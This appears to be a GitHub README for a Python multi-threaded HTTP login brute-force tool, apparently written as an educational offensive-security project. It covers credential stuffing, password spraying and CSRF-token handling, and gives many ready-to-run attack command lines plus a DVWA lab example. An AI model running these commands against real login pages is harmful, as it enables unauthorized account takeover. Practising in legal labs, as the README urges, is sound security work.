# 💥 http-bruteforce-tool

<div align="center">

![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=flat&logo=python&logoColor=white)
![Requests](https://img.shields.io/badge/Requires-requests-orange?style=flat)
![License](https://img.shields.io/badge/License-MIT-green?style=flat)
![Purpose](https://img.shields.io/badge/Purpose-Educational-orange?style=flat)

**Multi-threaded HTTP login brute-force tool — POST forms, Basic Auth, Digest Auth.**

</div>

> ⚠️ **Disclaimer** — For educational purposes only. Use exclusively on systems you own or have explicit written permission to test (CTF labs, DVWA, your own servers). Unauthorized brute-force attacks are illegal and may result in criminal prosecution.

---

## ✨ Features

- **3 attack modes** — POST form login, HTTP Basic Auth, HTTP Digest Auth
- **Multi-threaded** — configurable thread count for speed control
- **Smart detection** — failure/success based on response body strings OR status codes
- **CSRF token support** — auto-fetches CSRF token from login page
- **Proxy support** — route through Burp Suite for traffic inspection
- **Custom headers & cookies** — bypass basic protections
- **Rate limiting** — configurable delay to avoid lockouts
- **Credential stuffing** — username list × password list
- **Password spraying** — single password against many users
- **JSON report** — saves found credentials automatically

---

## 📋 Requirements

```bash
pip install requests
```

---

## 🚀 Usage

### Basic — POST form with single username

```bash
python3 http_bruteforce.py http://target.com/login \
  --username admin \
  --passlist /usr/share/wordlists/rockyou.txt
```

### Specify form field names

```bash
python3 http_bruteforce.py http://target.com/login \
  --username admin \
  --passlist passwords.txt \
  --user-field email \
  --pass-field pwd
```

### HTTP Basic Auth

```bash
python3 http_bruteforce.py http://target.com/admin \
  --mode basic \
  --username admin \
  --passlist passwords.txt
```

### Credential stuffing (user list × password list)

```bash
python3 http_bruteforce.py http://target.com/login \
  --userlist usernames.txt \
  --passlist passwords.txt \
  --threads 20
```

### With proxy (e.g. Burp Suite to inspect traffic)

```bash
python3 http_bruteforce.py http://target.com/login \
  --username admin \
  --passlist passwords.txt \
  --proxy http://127.0.0.1:8080
```

### Custom success/failure detection

```bash
# Detect success by status code 302
python3 http_bruteforce.py http://target.com/login \
  --username admin --passlist passwords.txt \
  --success-code 302

# Detect failure by custom string
python3 http_bruteforce.py http://target.com/login \
  --username admin --passlist passwords.txt \
  --failure-string "Access denied" "Try again"
```

### With CSRF token + extra form fields + rate limit

```bash
python3 http_bruteforce.py http://target.com/login \
  --username admin \
  --passlist passwords.txt \
  --csrf-field _token \
  --extra-data submit=Login \
  --delay 0.5 \
  --threads 5
```

### CTF example — DVWA (Damn Vulnerable Web Application)

```bash
# First get your session cookie from the browser, then:
python3 http_bruteforce.py "http://localhost/dvwa/login.php" \
  --username admin \
  --passlist /usr/share/wordlists/rockyou.txt \
  --user-field username \
  --pass-field password \
  --extra-data Login=Login \
  --cookie "PHPSESSID=your_session_id; security=low" \
  --failure-string "Login failed"
```

---

## 📊 Example Output

```
  TARGET    : http://192.168.1.100/login
  MODE      : FORM
  THREADS   : 10
  DELAY     : 0.0s

  [+] Loaded 14,344,392 entries from rockyou.txt
  [+] Queue: 14,344,392 credential pairs to test
  [*] Starting at 14:32:01

  [   2350] admin:password1234         | 487 req/s | 4.8s

══════════════════════════════════════════════════════
  [✓] CREDENTIALS FOUND!
  Username : admin
  Password : password1234
══════════════════════════════════════════════════════

  Attempts  : 2,351 / 14,344,392
  Duration  : 4.9s
  Rate      : 479 req/s
  [✓] FOUND  →  admin:password1234
  [+] Saved  →  found_20260502_143205.json
```

---

## 🧪 Safe practice environments

**Never test on systems you don't own.** Use these legal labs instead:

| Lab | URL | Notes |
|---|---|---|
| DVWA | [github.com/digininja/DVWA](https://github.com/digininja/DVWA) | Install locally with Docker |
| TryHackMe | [tryhackme.com](https://tryhackme.com) | Online labs, brute-force rooms |
| Hack The Box | [hackthebox.com](https://hackthebox.com) | CTF machines |
| VulnHub | [vulnhub.com](https://vulnhub.com) | Offline VMs |
| OWASP WebGoat | [owasp.org/www-project-webgoat](https://owasp.org/www-project-webgoat/) | Intentionally vulnerable |

---

## ⚙️ All options

```
Target:
  url                   Target URL
  --mode                form | basic | digest (default: form)

Credentials:
  --username, -u        Single username
  --userlist, -U        Username wordlist
  --passlist, -P        Password wordlist (required)

Form settings:
  --user-field          Username form field name (default: username)
  --pass-field          Password form field name (default: password)
  --extra-data          Extra POST fields as KEY=VALUE
  --csrf-field          CSRF token field name (auto-fetched)

Detection:
  --failure-string      Strings indicating failure
  --success-string      Strings indicating success
  --success-code        HTTP codes indicating success (e.g. 302)
  --failure-code        HTTP codes indicating failure (e.g. 401)

HTTP options:
  --header              Custom headers as 'Name: Value'
  --cookie              Cookies as 'name=value'
  --proxy               Proxy URL

Performance:
  --threads, -t         Thread count (default: 10)
  --delay, -d           Delay between requests in seconds
  --verbose, -v         Show every attempt
```

---

## 🧠 Concepts learned

Building this tool covers: **threading** (`threading.Thread`, `Queue`, thread-safe shared state), **HTTP requests** (`requests.Session`, POST, auth), **regex & HTML parsing**, **argparse**, **rate limiting**, **CSRF bypass**, **proxy routing**.

---

## 👤 Author

**Noé Jimenez-Greverent** — BTS CIEL | Cybersécurité Offensive

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/noé-jimenez-greverent)
[![GitHub](https://img.shields.io/badge/GitHub-100000?style=flat&logo=github&logoColor=white)](https://github.com/Noejimgre)
